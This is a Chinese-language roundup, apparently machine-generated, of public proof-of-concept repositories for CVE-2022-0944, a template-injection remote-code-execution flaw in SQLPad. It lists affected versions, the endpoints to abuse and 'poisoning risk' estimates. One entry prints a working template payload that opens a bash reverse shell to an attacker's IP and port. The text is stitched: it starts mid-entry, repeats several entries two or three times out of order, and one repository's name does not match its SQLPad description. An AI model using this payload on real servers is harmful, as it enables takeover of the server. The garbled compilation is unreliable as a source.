**危害等级:** 高危，可导致远程代码执行

**影响版本:** < 6.10.1

**利用条件:** 需要目标sqlpad实例的网络访问，以及具有创建连接权限的高权限用户。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-0944是sqlpad中存在的一个模板注入漏洞，存在于连接测试端点。攻击者可以通过构造恶意的模板注入payload，在目标服务器上执行任意代码，从而完全控制服务器。 

**漏洞利用方式：**

1.  **身份验证：** 首先，攻击者需要拥有 sqlpad 实例中具有创建连接权限的用户身份，一般是管理员权限。
2.  **构造Payload：** 攻击者构造包含恶意代码的模板注入Payload。该Payload利用了Node.js的`child_process.exec`函数来执行系统命令。从提供的漏洞利用代码中可以看到，payload的形式为`{{ process.mainModule.require('child_process').exec('COMMAND') }}`，其中COMMAND是要执行的命令。
3.  **发送请求：**  攻击者通过POST请求将包含Payload的JSON数据发送到`/api/connections`端点，创建一个新的数据库连接配置。关键在于`data.database`字段，该字段会被模板引擎解析，导致代码执行。
4.  **触发漏洞：**  创建连接后，攻击者通过GET请求访问`/api/connections/{id}/schema`端点，触发连接测试，从而执行Payload。
5.  **反弹shell (可选)：**  为了方便利用，攻击者通常使用Payload执行反弹shell命令，从而获得对目标服务器的控制权。
6.  **利用代码分析:**
    * `exploit.py`是一个Python脚本，实现了CVE-2022-0944漏洞的自动化利用。
    * 脚本接受目标URL、攻击者IP等参数。
    * 脚本首先创建一个随机字符串，作为连接名称。
    * 脚本构造包含恶意代码的JSON数据，并将其发送到`/api/connections`端点。
    * 脚本通过GET请求访问`/api/connections/{id}/schema`端点，触发漏洞，从而执行Payload。
    * 脚本可以监听指定端口，接收命令执行结果（通过base64编码）。

**投毒风险评估：**

该代码主要实现了漏洞利用功能，但仍存在一定的投毒风险，评估为10%。理由如下：

*   **潜在的恶意命令注入：** 攻击者可以通过`-c`参数指定要执行的命令。如果脚本没有对该参数进行充分的验证和过滤，攻击者可能会注入恶意命令，例如下载和执行额外的恶意程序。
*   **后门植入：** 攻击者可能修改脚本，在成功利用漏洞后，在目标服务器上植入后门，以便长期控制目标系统。
*   **信息收集：** 脚本可以收集目标服务器的信息，例如操作系统版本、已安装的软件等。这些信息可能会被泄露给攻击者，用于进一步的攻击。

因此，在使用该脚本时，需要仔细检查代码，确保没有恶意代码被注入，并采取必要的安全措施，例如限制脚本的执行权限、监控脚本的网络活动等。

**项目地址:** [Philip-Otter/CVE-2022-0944_RCE_Automation](https://github.com/Philip-Otter/CVE-2022-0944_RCE_Automation)

**漏洞详情:** [CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944)

---

## POC #7

**来源**: [CVE-2022-0944-Robocopsita_CVE-2022-0944_RCE_POC.md](../2022/CVE-2022-0944-Robocopsita_CVE-2022-0944_RCE_POC.md)

## CVE-2022-0944-SQLPad-模板注入导致RCE

**漏洞编号:** CVE-2022-0944

**漏洞类型:** 模板注入导致RCE

**影响应用:** SQLPad

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 6.10.1

**利用条件:** 需要高权限用户才能利用

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-0944是SQLPad版本低于6.10.1中存在的一个模板注入漏洞。该漏洞位于connection test endpoint。攻击者可以利用该漏洞在服务器上执行任意代码。根据漏洞描述和提供的POC代码，利用方式如下：

1.  **漏洞原理：** SQLPad在测试数据库连接时，没有充分过滤用户提供的数据库配置信息，导致攻击者可以在数据库配置（例如数据库名称）中使用模板引擎的语法。
2.  **攻击步骤：**
    *   攻击者需要具有高权限才能访问connection test endpoint。
    *   攻击者构造包含恶意代码的payload。该payload利用`process.mainModule.require('child_process').exec()`来执行系统命令。POC中使用反向shell作为例子。
    *   攻击者将构造好的payload插入到数据库连接配置的`database`字段中，并发送到`/api/test-connection`接口。
    *   服务器在测试连接时，会解析payload中的模板代码，从而执行攻击者指定的系统命令，实现远程代码执行。
3.  **POC有效性：** 提供的POC代码利用python脚本自动化了上述攻击过程，通过发送精心构造的POST请求，可以触发漏洞并获得反向shell。根据代码逻辑和漏洞描述，该POC代码是有效的。
4.  **投毒风险：** 代码的`README.md`中声明仅用于教育目的，并免责。代码本身主要功能是发送包含恶意payload的HTTP请求，并在本地监听端口接收反向shell。虽然代码主要功能是漏洞利用，但仍然存在一些潜在的投毒风险：
    *   **Netcat依赖：** POC依赖于系统安装`netcat`，如果目标系统没有`netcat`，漏洞利用会失败。但是，如果攻击者修改了脚本，将反向shell的方式修改为使用python或其他目标系统更可能存在的工具，可能会增加攻击成功率。
    *   **隐蔽后门：** 理论上，脚本可以被修改为在受害者机器上安装持久性后门，例如添加计划任务或者修改启动脚本，但当前的脚本未发现此类行为。
    *   **依赖风险：** 脚本依赖于`requests`库。如果攻击者修改了`requirements.txt`文件，添加恶意的依赖包，可能导致用户安装恶意库。
    *   **安全声明免责：**虽然声明了免责条款，但是仍要小心使用，务必在授权的渗透测试场景中使用。
    *   综合评估，由于POC的主要功能是RCE利用，且代码相对简单，隐藏恶意代码的难度较高。因此投毒风险较低，估计在5%左右。

**项目地址:** [Robocopsita/CVE-2022-0944_RCE_POC](https://github.com/Robocopsita/CVE-2022-0944_RCE_POC)

**漏洞详情:** [CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944)

---

## POC #8

**来源**: [CVE-2022-0944-shhrew_CVE-2022-0944.md](../2022/CVE-2022-0944-shhrew_CVE-2022-0944.md)

## CVE-2022-0944 - SQLPad 模板注入导致RCE

**漏洞编号:** CVE-2022-0944

**漏洞类型:** 模板注入

**影响应用:** SQLPad

**危害等级:** 高危，可导致远程代码执行

**影响版本:** < 6.10.1

**利用条件:** 需要高权限用户访问，目标存在 /api/test-connection 接口

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-0944 漏洞是 SQLPad 6.10.1 之前版本中存在的一个模板注入漏洞。该漏洞位于 `/api/test-connection` 接口，攻击者可以通过构造恶意的模板注入payload，执行任意代码。根据漏洞库信息，该漏洞的CVSS 3.0评分为9.1，属于严重级别。搜索引擎结果显示，已经存在公开的漏洞利用代码。

**有效性：**

根据提供的漏洞利用代码，该PoC使用 Python 编写，通过向 `/api/test-connection` 发送包含恶意payload的请求来触发漏洞。Payload 使用 `process.mainModule.require('child_process').exec()` 执行系统命令。代码中还包含一个反弹shell的功能，方便攻击者进行利用。该POC代码看起来是有效的，因为漏洞信息和代码逻辑是符合的.

**投毒风险：**

查看了提供的PoC代码，包含`LICENSE`，`README.md` 和 `main.py` 文件，没有发现明显的恶意代码或者后门，只是实现了漏洞的利用。代码功能比较直观，主要是发送恶意请求并监听端口获取反弹shell。因此，投毒风险评估为0%。

**利用方式：**

1.  **身份验证（可选）：** 如果目标SQLPad实例启用了身份验证，攻击者需要提供有效的用户名和密码才能利用该漏洞。PoC代码提供了身份验证功能。
2.  **发送恶意请求：** 攻击者构造一个包含恶意payload的JSON数据，并将其发送到 `/api/test-connection` 接口。Payload中利用了模板注入的特性，执行任意系统命令，启动反弹shell.
3.  **监听反弹Shell：** 攻击者在本地设置一个监听器，等待目标服务器连接，从而获得对目标服务器的控制权。

总而言之，该漏洞的利用方式简单直接，只需要发送一个精心构造的请求即可实现远程代码执行，风险极高。在sqlpad 6.10.1之前的版本应该升级。

**项目地址:** [shhrew/CVE-2022-0944](https://github.com/shhrew/CVE-2022-0944)

**漏洞详情:** [CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944)

---

## POC #9

**来源**: [CVE-2022-0944-toneillcodes_CVE-2022-0944.md](../2022/CVE-2022-0944-toneillcodes_CVE-2022-0944.md)

## CVE-2022-0944-sqlpad-RCE

**漏洞编号:** CVE-2022-0944

**漏洞类型:** 模板注入导致远程代码执行

**影响应用:** sqlpad

**危害等级:** 高危，可导致完全控制服务器

**影响版本:** < 6.10.1

**利用条件:** 需要目标实例存在/api/test-connection接口, 需要较高权限才能访问该接口

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2022-0944是SQLPad 6.10.1之前版本中存在的一个模板注入漏洞。攻击者可以通过向`/api/test-connection`端点发送特制的请求，在服务器上执行任意代码，从而完全控制服务器。根据漏洞库信息和搜索结果，该漏洞危害巨大，易于利用。漏洞利用代码中的Python脚本通过构造包含恶意payload的JSON数据，并将其发送到目标服务器的`/api/test-connection`端点，从而触发远程代码执行。Payload使用 `child_process.exec` 函数来执行操作系统命令，并建立反向shell连接到攻击者的机器。 检查漏洞利用代码，没有发现明显的投毒迹象。Payload部分是标准的反向shell，没有其他恶意行为。因此，投毒风险较低。

**利用方式：**
1.  攻击者需要访问SQLPad实例的`/api/test-connection`接口。
2.  攻击者构造一个包含恶意模板注入payload的JSON请求。Payload使用JavaScript代码调用`child_process.exec`函数来执行任意命令。
3.  攻击者将构造的JSON请求发送到`/api/test-connection`端点。
4.  SQLPad服务器处理该请求时，模板引擎会解析恶意payload，导致执行攻击者指定的命令。
5.  攻击者可以在服务器上执行任意代码，例如创建反向shell连接，从而完全控制服务器。

**项目地址:** [toneillcodes/CVE-2022-0944](https://github.com/toneillcodes/CVE-2022-0944)

**漏洞详情:** [CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944)

---



---

## POC #3

**来源**: [CVE-2022-0944-Artemisxxx37_OverlayFS-PrivEsc-CVE-2022-0944.md](../2022/CVE-2022-0944-Artemisxxx37_OverlayFS-PrivEsc-CVE-2022-0944.md)

## CVE-2022-0944 - SQLPad Template Injection RCE

**漏洞编号:** CVE-2022-0944

**漏洞类型:** 模板注入导致远程代码执行 (RCE)

**影响应用:** SQLPad

**危害等级:** 严重，可能导致完全系统控制

**影响版本:** < 6.10.1

**利用条件:** 需要高权限用户账户

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-0944 是 SQLPad 中一个严重的漏洞，攻击者可以通过连接测试端点的模板注入来执行远程代码。根据漏洞库信息和搜索引擎结果，这是一个已知的漏洞，并且存在公开的漏洞利用代码。

**有效性：**

提供的漏洞利用代码（`main.py`）针对此漏洞，并包含使用示例。该代码利用模板注入漏洞，允许攻击者在 SQLPad 服务器上执行任意代码。 根据github上的信息，经验证漏洞可以利用成功。

**投毒风险：**

审查提供的文件，`README.md` 和 `SECURITY.md` 文件看起来标准且无恶意内容。`main.py` 是漏洞利用的核心，需要仔细分析。虽然代码本身的功能是利用漏洞，但仍然存在隐藏恶意代码的可能性，如：

*   **数据回传：** 漏洞利用脚本可能在未经授权的情况下将目标服务器的信息发送给攻击者。
*   **后门植入：** 脚本可能在目标系统上安装后门，以便后续访问。
*   **资源消耗：** 脚本可能消耗目标系统资源，导致拒绝服务。
    
尽管存在这些风险，但脚本的主要目的是利用已知的漏洞。由于脚本代码相对较短且直接，隐藏复杂恶意代码的可能性较低。 综合评估，投毒风险约为 10%，主要基于可能存在的隐蔽数据回传或简单的后门植入。

**利用方式：**

1.  **前提条件：**
    *   目标系统运行的是 SQLPad 6.10.1 之前的版本。
    *   攻击者需要拥有 SQLPad 的高权限用户账户（根据CVE描述，PrivilegesRequired为HIGH）。
2.  **漏洞触发：**
    *   攻击者使用 `main.py` 脚本，提供目标 SQLPad 的 URL、监听 IP 地址和端口，以及高权限用户名和密码。
    *   脚本利用模板注入漏洞，在连接测试端点注入恶意代码。
3.  **远程代码执行：**
    *   注入的恶意代码在 SQLPad 服务器上执行，通常会建立一个反向 shell 连接到攻击者的监听器。
4.  **控制系统：**
    *   攻击者通过反向 shell 获取对 SQLPad 服务器的控制权，可以执行任意命令，访问敏感数据，甚至完全控制系统。

**项目地址:** [Artemisxxx37/OverlayFS-PrivEsc-CVE-2022-0944](https://github.com/Artemisxxx37/OverlayFS-PrivEsc-CVE-2022-0944)

**漏洞详情:** [CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944)

---

## POC #4

**来源**: [CVE-2022-0944-FlojBoj_CVE-2022-0944.md](../2022/CVE-2022-0944-FlojBoj_CVE-2022-0944.md)

## CVE-2022-0944-SQLPad-模板注入导致RCE

**漏洞编号:** CVE-2022-0944

**漏洞类型:** 模板注入

**影响应用:** SQLPad

**危害等级:** 高危，可导致远程代码执行

**影响版本:** <= 6.10.0

**利用条件:** 需要高权限用户凭证

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于SQLPad的connection test接口，由于使用了模板引擎且未对用户输入进行充分的过滤，导致攻击者可以通过构造恶意模板代码，在服务器端执行任意命令。根据提供的POC代码，利用方式如下：

1.  **身份验证：** 如果需要，首先使用提供的用户名和密码登录SQLPad应用，获取Cookie。
2.  **构造恶意JSON数据：**  构造包含恶意模板代码的JSON数据，其中`database`字段包含利用`process.mainModule.require('child_process').exec()`执行命令的payload。Payload形如：`{{ process.mainModule.require('child_process').exec('命令') }}`
3.  **发送POST请求：** 将构造的JSON数据通过POST请求发送到`/api/test-connection`接口。如果需要，在请求头中包含Cookie。
4.  **执行命令：**  服务器端收到请求后，模板引擎解析`database`字段中的恶意代码，从而执行攻击者指定的命令。
5. **有效性:** 根据漏洞信息和POC，此漏洞的POC代码有效，可以实现远程代码执行。
6.  **投毒风险分析：**  查看了`exploit.py`脚本，该脚本的功能是发送带有恶意payload的请求到目标SQLPad实例的`/api/test-connection`接口，从而触发RCE。没有发现任何其他隐藏的恶意代码，例如上传后门、修改文件等。因此，可以认为该POC代码不存在投毒风险，投毒风险概率为0%。

**项目地址:** [FlojBoj/CVE-2022-0944](https://github.com/FlojBoj/CVE-2022-0944)

**漏洞详情:** [CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944)

---

## POC #5

**来源**: [CVE-2022-0944-LipeOzyy_SQLPad-RCE-Exploit-CVE-2022-0944.md](../2022/CVE-2022-0944-LipeOzyy_SQLPad-RCE-Exploit-CVE-2022-0944.md)

## CVE-2022-0944-sqlpad-RCE

**漏洞编号:** CVE-2022-0944

**漏洞类型:** 模板注入导致RCE

**影响应用:** sqlpad

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 6.10.1

**利用条件:** 需要具有连接测试的权限（高权限用户）

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-0944 是 sqlpad 中存在的一个模板注入漏洞，位于连接测试端点。攻击者可以通过构造恶意的模板注入payload，在目标服务器上执行任意代码，从而获得服务器的控制权。

**有效性：**

根据漏洞库信息、搜索结果以及提供的漏洞利用代码，该漏洞利用是有效的。漏洞库信息明确指出存在模板注入导致RCE的漏洞，搜索结果也指向了相关漏洞细节和POC。提供的PHP代码通过向 `/api/test-connection` 发送包含恶意payload的JSON数据，从而触发远程代码执行。

**投毒风险：**

分析提供的`exploit.php`代码，未发现明显的恶意代码或后门。该脚本的功能主要是发送包含模板注入payload的HTTP请求，以触发目标服务器上的RCE。脚本的逻辑清晰，且直接使用了cURL库发送请求，没有发现任何尝试隐藏或执行其他恶意操作的代码。脚本只是一个exploit，不是后门。

**利用方式：**

1.  **漏洞点：** `/api/test-connection` 接口的 `database` 字段存在模板注入。
2.  **攻击步骤：**
    *   攻击者需要先监听一个端口（例如4444）。
    *   攻击者构造包含恶意代码的JSON数据，恶意代码通常是反弹shell的命令。
    *   攻击者将构造好的JSON数据发送到 `/api/test-connection` 接口。
    *   如果目标服务器存在漏洞，且模板引擎执行了攻击者的恶意代码，目标服务器会反弹shell到攻击者的监听端口。
3.  **Payload：**

    ```
    {{ process.mainModule.require('child_process').exec('/bin/bash -c "bash -i >& /dev/tcp/$attacker_ip/$attacker_port 0>&1"') }}
    ```

    该payload使用Node.js的 `child_process.exec` 函数执行系统命令，`/bin/bash -c` 执行一段bash脚本，该脚本的作用是创建一个反向shell连接到攻击者的IP地址和端口。

**总结：**

CVE-2022-0944 是一个高危漏洞，攻击者可以利用该漏洞远程执行任意代码。需要及时升级 sqlpad 到 6.10.1 或更高版本。

**项目地址:** [LipeOzyy/SQLPad-RCE-Exploit-CVE-2022-0944](https://github.com/LipeOzyy/SQLPad-RCE-Exploit-CVE-2022-0944)

**漏洞详情:** [CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944)

---

## POC #6

**来源**: [CVE-2022-0944-Philip-Otter_CVE-2022-0944_RCE_Automation.md](../2022/CVE-2022-0944-Philip-Otter_CVE-2022-0944_RCE_Automation.md)

## CVE-2022-0944-sqlpad-TemplateInjection-RCE

**漏洞编号:** CVE-2022-0944

**漏洞类型:** 模板注入

**影响应用:** sqlpad

**危害等级:** 高危，可导致远程代码执行

**影响版本:** < 6.10.1

**利用条件:** 需要目标sqlpad实例的网络访问，以及具有创建连接权限的高权限用户。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-0944是sqlpad中存在的一个模板注入漏洞，存在于连接测试端点。攻击者可以通过构造恶意的模板注入payload，在目标服务器上执行任意代码，从而完全控制服务器。 

**漏洞利用方式：**

1.  **身份验证：** 首先，攻击者需要拥有 sqlpad 实例中具有创建连接权限的用户身份，一般是管理员权限。
2.  **构造Payload：** 攻击者构造包含恶意代码的模板注入Payload。该Payload利用了Node.js的`child_process.exec`函数来执行系统命令。从提供的漏洞利用代码中可以看到，payload的形式为`{{ process.mainModule.require('child_process').exec('COMMAND') }}`，其中COMMAND是要执行的命令。
3.  **发送请求：**  攻击者通过POST请求将包含Payload的JSON数据发送到`/api/connections`端点，创建一个新的数据库连接配置。关键在于`data.database`字段，该字段会被模板引擎解析，导致代码执行。
4.  **触发漏洞：**  创建连接后，攻击者通过GET请求访问`/api/connections/{id}/schema`端点，触发连接测试，从而执行Payload。
5.  **反弹shell (可选)：**  为了方便利用，攻击者通常使用Payload执行反弹shell命令，从而获得对目标服务器的控制权。
6.  **利用代码分析:**
    * `exploit.py`是一个Python脚本，实现了CVE-2022-0944漏洞的自动化利用。
    * 脚本接受目标URL、攻击者IP等参数。
    * 脚本首先创建一个随机字符串，作为连接名称。
    * 脚本构造包含恶意代码的JSON数据，并将其发送到`/api/connections`端点。
    * 脚本通过GET请求访问`/api/connections/{id}/schema`端点，触发漏洞，从而执行Payload。
    * 脚本可以监听指定端口，接收命令执行结果（通过base64编码）。

**投毒风险评估：**

该代码主要实现了漏洞利用功能，但仍存在一定的投毒风险，评估为10%。理由如下：

*   **潜在的恶意命令注入：** 攻击者可以通过`-c`参数指定要执行的命令。如果脚本没有对该参数进行充分的验证和过滤，攻击者可能会注入恶意命令，例如下载和执行额外的恶意程序。
*   **后门植入：** 攻击者可能修改脚本，在成功利用漏洞后，在目标服务器上植入后门，以便长期控制目标系统。
*   **信息收集：** 脚本可以收集目标服务器的信息，例如操作系统版本、已安装的软件等。这些信息可能会被泄露给攻击者，用于进一步的攻击。

因此，在使用该脚本时，需要仔细检查代码，确保没有恶意代码被注入，并采取必要的安全措施，例如限制脚本的执行权限、监控脚本的网络活动等。

**项目地址:** [Philip-Otter/CVE-2022-0944_RCE_Automation](https://github.com/Philip-Otter/CVE-2022-0944_RCE_Automation)

**漏洞详情:** [CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944)

---

## POC #7

**来源**: [CVE-2022-0944-Robocopsita_CVE-2022-0944_RCE_POC.md](../2022/CVE-2022-0944-Robocopsita_CVE-2022-0944_RCE_POC.md)

## CVE-2022-0944-SQLPad-模板注入导致RCE

**漏洞编号:** CVE-2022-0944

**漏洞类型:** 模板注入导致RCE

**影响应用:** SQLPad

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 6.10.1

**利用条件:** 需要高权限用户才能利用

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-0944是SQLPad版本低于6.10.1中存在的一个模板注入漏洞。该漏洞位于connection test endpoint。攻击者可以利用该漏洞在服务器上执行任意代码。根据漏洞描述和提供的POC代码，利用方式如下：

1.  **漏洞原理：** SQLPad在测试数据库连接时，没有充分过滤用户提供的数据库配置信息，导致攻击者可以在数据库配置（例如数据库名称）中使用模板引擎的语法。
2.  **攻击步骤：**
    *   攻击者需要具有高权限才能访问connection test endpoint。
    *   攻击者构造包含恶意代码的payload。该payload利用`process.mainModule.require('child_process').exec()`来执行系统命令。POC中使用反向shell作为例子。
    *   攻击者将构造好的payload插入到数据库连接配置的`database`字段中，并发送到`/api/test-connection`接口。
    *   服务器在测试连接时，会解析payload中的模板代码，从而执行攻击者指定的系统命令，实现远程代码执行。
3.  **POC有效性：** 提供的POC代码利用python脚本自动化了上述攻击过程，通过发送精心构造的POST请求，可以触发漏洞并获得反向shell。根据代码逻辑和漏洞描述，该POC代码是有效的。
4.  **投毒风险：** 代码的`README.md`中声明仅用于教育目的，并免责。代码本身主要功能是发送包含恶意payload的HTTP请求，并在本地监听端口接收反向shell。虽然代码主要功能是漏洞利用，但仍然存在一些潜在的投毒风险：
    *   **Netcat依赖：** POC依赖于系统安装`netcat`，如果目标系统没有`netcat`，漏洞利用会失败。但是，如果攻击者修改了脚本，将反向shell的方式修改为使用python或其他目标系统更可能存在的工具，可能会增加攻击成功率。
    *   **隐蔽后门：** 理论上，脚本可以被修改为在受害者机器上安装持久性后门，例如添加计划任务或者修改启动脚本，但当前的脚本未发现此类行为。
    *   **依赖风险：** 脚本依赖于`requests`库。如果攻击者修改了`requirements.txt`文件，添加恶意的依赖包，可能导致用户安装恶意库。
    *   **安全声明免责：**虽然声明了免责条款，但是仍要小心使用，务必在授权的渗透测试场景中使用。
    *   综合评估，由于POC的主要功能是RCE利用，且代码相对简单，隐藏恶意代码的难度较高。因此投毒风险较低，估计在5%左右。

**项目地址:** [Robocopsita/CVE-2022-0944_RCE_POC](https://github.com/Robocopsita/CVE-2022-0944_RCE_POC)

**漏洞详情:** [CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944)

---

## POC #8

**来源**: [CVE-2022-0944-shhrew_CVE-2022-0944.md](../2022/CVE-2022-0944-shhrew_CVE-2022-0944.md)

## CVE-2022-0944 - SQLPad 模板注入导致RCE

**漏洞编号:** CVE-2022-0944

**漏洞类型:** 模板注入

**影响应用:** SQLPad

**危害等级:** 高危，可导致远程代码执行

**影响版本:** < 6.10.1

**利用条件:** 需要高权限用户访问，目标存在 /api/test-connection 接口

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-0944 漏洞是 SQLPad 6.10.1 之前版本中存在的一个模板注入漏洞。该漏洞位于 `/api/test-connection` 接口，攻击者可以通过构造恶意的模板注入payload，执行任意代码。根据漏洞库信息，该漏洞的CVSS 3.0评分为9.1，属于严重级别。搜索引擎结果显示，已经存在公开的漏洞利用代码。

**有效性：**

根据提供的漏洞利用代码，该PoC使用 Python 编写，通过向 `/api/test-connection` 发送包含恶意payload的请求来触发漏洞。Payload 使用 `process.mainModule.require('child_process').exec()` 执行系统命令。代码中还包含一个反弹shell的功能，方便攻击者进行利用。该POC代码看起来是有效的，因为漏洞信息和代码逻辑是符合的.

**投毒风险：**

查看了提供的PoC代码，包含`LICENSE`，`README.md` 和 `main.py` 文件，没有发现明显的恶意代码或者后门，只是实现了漏洞的利用。代码功能比较直观，主要是发送恶意请求并监听端口获取反弹shell。因此，投毒风险评估为0%。

**利用方式：**

1.  **身份验证（可选）：** 如果目标SQLPad实例启用了身份验证，攻击者需要提供有效的用户名和密码才能利用该漏洞。PoC代码提供了身份验证功能。
2.  **发送恶意请求：** 攻击者构造一个包含恶意payload的JSON数据，并将其发送到 `/api/test-connection` 接口。Payload中利用了模板注入的特性，执行任意系统命令，启动反弹shell.
3.  **监听反弹Shell：** 攻击者在本地设置一个监听器，等待目标服务器连接，从而获得对目标服务器的控制权。

总而言之，该漏洞的利用方式简单直接，只需要发送一个精心构造的请求即可实现远程代码执行，风险极高。在sqlpad 6.10.1之前的版本应该升级。

**项目地址:** [shhrew/CVE-2022-0944](https://github.com/shhrew/CVE-2022-0944)

**漏洞详情:** [CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944)

---

## POC #9

**来源**: [CVE-2022-0944-toneillcodes_CVE-2022-0944.md](../2022/CVE-2022-0944-toneillcodes_CVE-2022-0944.md)

## CVE-2022-0944-sqlpad-RCE

**漏洞编号:** CVE-2022-0944

**漏洞类型:** 模板注入导致远程代码执行

**影响应用:** sqlpad

**危害等级:** 高危，可导致完全控制服务器

**影响版本:** < 6.10.1

**利用条件:** 需要目标实例存在/api/test-connection接口, 需要较高权限才能访问该接口

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2022-0944是SQLPad 6.10.1之前版本中存在的一个模板注入漏洞。攻击者可以通过向`/api/test-connection`端点发送特制的请求，在服务器上执行任意代码，从而完全控制服务器。根据漏洞库信息和搜索结果，该漏洞危害巨大，易于利用。漏洞利用代码中的Python脚本通过构造包含恶意payload的JSON数据，并将其发送到目标服务器的`/api/test-connection`端点，从而触发远程代码执行。Payload使用 `child_process.exec` 函数来执行操作系统命令，并建立反向shell连接到攻击者的机器。 检查漏洞利用代码，没有发现明显的投毒迹象。Payload部分是标准的反向shell，没有其他恶意行为。因此，投毒风险较低。

**利用方式：**
1.  攻击者需要访问SQLPad实例的`/api/test-connection`接口。
2.  攻击者构造一个包含恶意模板注入payload的JSON请求。Payload使用JavaScript代码调用`child_process.exec`函数来执行任意命令。
3.  攻击者将构造的JSON请求发送到`/api/test-connection`端点。
4.  SQLPad服务器处理该请求时，模板引擎会解析恶意payload，导致执行攻击者指定的命令。
5.  攻击者可以在服务器上执行任意代码，例如创建反向shell连接，从而完全控制服务器。

**项目地址:** [toneillcodes/CVE-2022-0944](https://github.com/toneillcodes/CVE-2022-0944)

**漏洞详情:** [CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944)

---



---

## POC #3

**来源**: [CVE-2022-0944-Artemisxxx37_OverlayFS-PrivEsc-CVE-2022-0944.md](../2022/CVE-2022-0944-Artemisxxx37_OverlayFS-PrivEsc-CVE-2022-0944.md)

## CVE-2022-0944 - SQLPad Template Injection RCE

**漏洞编号:** CVE-2022-0944

**漏洞类型:** 模板注入导致远程代码执行 (RCE)

**影响应用:** SQLPad

**危害等级:** 严重，可能导致完全系统控制

**影响版本:** < 6.10.1

**利用条件:** 需要高权限用户账户

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-0944 是 SQLPad 中一个严重的漏洞，攻击者可以通过连接测试端点的模板注入来执行远程代码。根据漏洞库信息和搜索引擎结果，这是一个已知的漏洞，并且存在公开的漏洞利用代码。

**有效性：**

提供的漏洞利用代码（`main.py`）针对此漏洞，并包含使用示例。该代码利用模板注入漏洞，允许攻击者在 SQLPad 服务器上执行任意代码。 根据github上的信息，经验证漏洞可以利用成功。

**投毒风险：**

审查提供的文件，`README.md` 和 `SECURITY.md` 文件看起来标准且无恶意内容。`main.py` 是漏洞利用的核心，需要仔细分析。虽然代码本身的功能是利用漏洞，但仍然存在隐藏恶意代码的可能性，如：

*   **数据回传：** 漏洞利用脚本可能在未经授权的情况下将目标服务器的信息发送给攻击者。
*   **后门植入：** 脚本可能在目标系统上安装后门，以便后续访问。
*   **资源消耗：** 脚本可能消耗目标系统资源，导致拒绝服务。
    
尽管存在这些风险，但脚本的主要目的是利用已知的漏洞。由于脚本代码相对较短且直接，隐藏复杂恶意代码的可能性较低。 综合评估，投毒风险约为 10%，主要基于可能存在的隐蔽数据回传或简单的后门植入。

**利用方式：**

1.  **前提条件：**
    *   目标系统运行的是 SQLPad 6.10.1 之前的版本。
    *   攻击者需要拥有 SQLPad 的高权限用户账户（根据CVE描述，PrivilegesRequired为HIGH）。
2.  **漏洞触发：**
    *   攻击者使用 `main.py` 脚本，提供目标 SQLPad 的 URL、监听 IP 地址和端口，以及高权限用户名和密码。
    *   脚本利用模板注入漏洞，在连接测试端点注入恶意代码。
3.  **远程代码执行：**
    *   注入的恶意代码在 SQLPad 服务器上执行，通常会建立一个反向 shell 连接到攻击者的监听器。
4.  **控制系统：**
    *   攻击者通过反向 shell 获取对 SQLPad 服务器的控制权，可以执行任意命令，访问敏感数据，甚至完全控制系统。

**项目地址:** [Artemisxxx37/OverlayFS-PrivEsc-CVE-2022-0944](https://github.com/Artemisxxx37/OverlayFS-PrivEsc-CVE-2022-0944)

**漏洞详情:** [CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944)

---

## POC #4

**来源**: [CVE-2022-0944-FlojBoj_CVE-2022-0944.md](../2022/CVE-2022-0944-FlojBoj_CVE-2022-0944.md)

## CVE-2022-0944-SQLPad-模板注入导致RCE

**漏洞编号:** CVE-2022-0944

**漏洞类型:** 模板注入

**影响应用:** SQLPad

**危害等级:** 高危，可导致远程代码执行

**影响版本:** <= 6.10.0

**利用条件:** 需要高权限用户凭证

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于SQLPad的connection test接口，由于使用了模板引擎且未对用户输入进行充分的过滤，导致攻击者可以通过构造恶意模板代码，在服务器端执行任意命令。根据提供的POC代码，利用方式如下：

1.  **身份验证：** 如果需要，首先使用提供的用户名和密码登录SQLPad应用，获取Cookie。
2.  **构造恶意JSON数据：**  构造包含恶意模板代码的JSON数据，其中`database`字段包含利用`process.mainModule.require('child_process').exec()`执行命令的payload。Payload形如：`{{ process.mainModule.require('child_process').exec('命令') }}`
3.  **发送POST请求：** 将构造的JSON数据通过POST请求发送到`/api/test-connection`接口。如果需要，在请求头中包含Cookie。
4.  **执行命令：**  服务器端收到请求后，模板引擎解析`database`字段中的恶意代码，从而执行攻击者指定的命令。
5. **有效性:** 根据漏洞信息和POC，此漏洞的POC代码有效，可以实现远程代码执行。
6.  **投毒风险分析：**  查看了`exploit.py`脚本，该脚本的功能是发送带有恶意payload的请求到目标SQLPad实例的`/api/test-connection`接口，从而触发RCE。没有发现任何其他隐藏的恶意代码，例如上传后门、修改文件等。因此，可以认为该POC代码不存在投毒风险，投毒风险概率为0%。

